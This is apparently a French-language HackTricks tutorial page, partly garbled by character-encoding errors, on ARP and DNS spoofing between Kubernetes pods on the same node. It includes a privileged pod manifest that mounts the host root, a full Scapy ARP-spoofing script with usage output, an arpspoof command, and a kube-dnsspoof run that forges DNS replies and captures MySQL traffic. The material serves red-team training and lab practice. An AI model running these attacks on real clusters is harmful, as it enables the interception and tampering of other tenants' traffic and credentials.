# Kubernetes Network Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Introduction

Dans Kubernetes, il est observ√© qu'un comportement par d√©faut permet l'√©tablissement de connexions entre **tous les conteneurs r√©sidant sur le m√™me n≈ìud**. Cela s'applique ind√©pendamment des distinctions de namespace. Une telle connectivit√© s'√©tend jusqu'√† **la couche 2** (Ethernet). Par cons√©quent, cette configuration expose potentiellement le syst√®me √† des vuln√©rabilit√©s. Plus pr√©cis√©ment, elle ouvre la possibilit√© pour un **conteneur malveillant** d'ex√©cuter une **attaque par usurpation ARP** contre d'autres conteneurs situ√©s sur le m√™me n≈ìud. Lors d'une telle attaque, le conteneur malveillant peut tromper pour intercepter ou modifier le trafic r√©seau destin√© √† d'autres conteneurs.

Les attaques par usurpation ARP impliquent que **l'attaquant envoie des messages ARP falsifi√©s** (Address Resolution Protocol) sur un r√©seau local. Cela entra√Æne le lien de **l'adresse MAC de l'attaquant avec l'adresse IP d'un ordinateur ou serveur l√©gitime sur le r√©seau**. Apr√®s l'ex√©cution r√©ussie d'une telle attaque, l'attaquant peut intercepter, modifier ou m√™me arr√™ter des donn√©es en transit. L'attaque est ex√©cut√©e sur la couche 2 du mod√®le OSI, c'est pourquoi la connectivit√© par d√©faut dans Kubernetes √† ce niveau soul√®ve des pr√©occupations de s√©curit√©.

Dans le sc√©nario, 4 machines vont √™tre cr√©√©es :

* ubuntu-pe : Machine privil√©gi√©e pour s'√©chapper vers le n≈ìud et v√©rifier les m√©triques (non n√©cessaire pour l'attaque)
* **ubuntu-attack** : **Conteneur malveillant** dans le namespace par d√©faut
* **ubuntu-victim** : Machine **victime** dans le namespace kube-system
* **mysql** : Machine **victime** dans le namespace par d√©faut
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## R√©seau Kubernetes de base

Si vous souhaitez plus de d√©tails sur les sujets de r√©seau introduits ici, consultez les r√©f√©rences.

### ARP

En g√©n√©ral, **le r√©seau pod-√†-pod √† l'int√©rieur du n≈ìud** est disponible via un **pont** qui connecte tous les pods. Ce pont s'appelle ‚Äú**cbr0**‚Äù. (Certains plugins r√©seau installeront leur propre pont.) Le **cbr0 peut √©galement g√©rer ARP** (Address Resolution Protocol) r√©solution. Lorsqu'un paquet entrant arrive √† cbr0, il peut r√©soudre l'adresse MAC de destination en utilisant ARP.

Ce fait implique que, par d√©faut, **chaque pod s'ex√©cutant dans le m√™me n≈ìud** sera capable de **communiquer** avec tout autre pod dans le m√™me n≈ìud (ind√©pendamment de l'espace de noms) au niveau ethernet (couche 2).

{% hint style="warning" %}
Par cons√©quent, il est possible d'effectuer des **attaques de spoofing ARP entre les pods dans le m√™me n≈ìud.**
{% endhint %}

### DNS

Dans les environnements kubernetes, vous trouverez g√©n√©ralement 1 (ou plusieurs) **services DNS en cours d'ex√©cution** g√©n√©ralement dans l'espace de noms kube-system :
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
Dans les informations pr√©c√©dentes, vous pouvez voir quelque chose d'int√©ressant, l'**IP du service** est **10.96.0.10** mais l'**IP du pod** ex√©cutant le service est **172.17.0.2.**

Si vous v√©rifiez l'adresse DNS √† l'int√©rieur de n'importe quel pod, vous trouverez quelque chose comme ceci :
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
Cependant, le pod **ne sait pas** comment acc√©der √† cette **adresse** car la **plage de pods** dans ce cas est 172.17.0.10/26.

Par cons√©quent, le pod enverra les **requ√™tes DNS √† l'adresse 10.96.0.10** qui sera **traduit** par le cbr0 **en** **172.17.0.2**.

{% hint style="warning" %}
Cela signifie qu'une **requ√™te DNS** d'un pod va **toujours** passer par le **pont** pour **traduire** l'**IP du service en l'IP de l'endpoint**, m√™me si le serveur DNS est dans le m√™me sous-r√©seau que le pod.

Sachant cela, et sachant que **les attaques ARP sont possibles**, un **pod** dans un n≈ìud sera capable de **intercepter le trafic** entre **chaque pod** dans le **sous-r√©seau** et le **pont** et **modifier** les **r√©ponses DNS** du serveur DNS (**DNS Spoofing**).

De plus, si le **serveur DNS** est dans le **m√™me n≈ìud que l'attaquant**, l'attaquant peut **intercepter toutes les requ√™tes DNS** de n'importe quel pod dans le cluster (entre le serveur DNS et le pont) et modifier les r√©ponses.
{% endhint %}

## Spoofing ARP dans les pods dans le m√™me n≈ìud

Notre objectif est de **voler au moins la communication de l'ubuntu-victim au mysql**.

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Spoofing

Comme d√©j√† mentionn√©, si vous **compromettez un pod dans le m√™me n≈ìud que le pod serveur DNS**, vous pouvez **MitM** avec **ARPSpoofing** le **pont et le pod DNS** et **modifier toutes les r√©ponses DNS**.

Vous avez un tr√®s bon **outil** et **tutoriel** pour tester cela sur [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)

Dans notre sc√©nario, **t√©l√©chargez** l'**outil** dans le pod attaquant et cr√©ez un \*\*fichier nomm√© `hosts` \*\* avec les **domaines** que vous souhaitez **spoof** comme :
```
cat hosts
google.com. 1.1.1.1
```
Effectuez l'attaque sur la machine ubuntu-victim :
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
Si vous essayez de cr√©er votre propre script de spoofing DNS, si vous **modifiez simplement la r√©ponse DNS** cela **ne fonctionnera pas**, car la **r√©ponse** aura une **src IP** l'adresse IP du **pod** **malveillant** et **ne sera pas** **accept√©e**.\
Vous devez g√©n√©rer un **nouveau paquet DNS** avec la **src IP** du **DNS** o√π la victime envoie la requ√™te DNS (qui est quelque chose comme 172.16.0.2, pas 10.96.0.10, c'est l'IP du service DNS K8s et non l'IP du serveur DNS, plus d'informations √† ce sujet dans l'introduction).
{% endhint %}

## Capturer le trafic

L'outil [**Mizu**](https://github.com/up9inc/mizu) est un visualiseur de trafic API **simple mais puissant pour Kubernetes** vous permettant de **voir toute la communication API** entre les microservices pour vous aider √† d√©boguer et √† r√©soudre les r√©gressions.\
Il installera des agents dans les pods s√©lectionn√©s et rassemblera leurs informations de trafic pour vous les montrer sur un serveur web. Cependant, vous aurez besoin de permissions K8s √©lev√©es pour cela (et ce n'est pas tr√®s furtif).

## R√©f√©rences

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
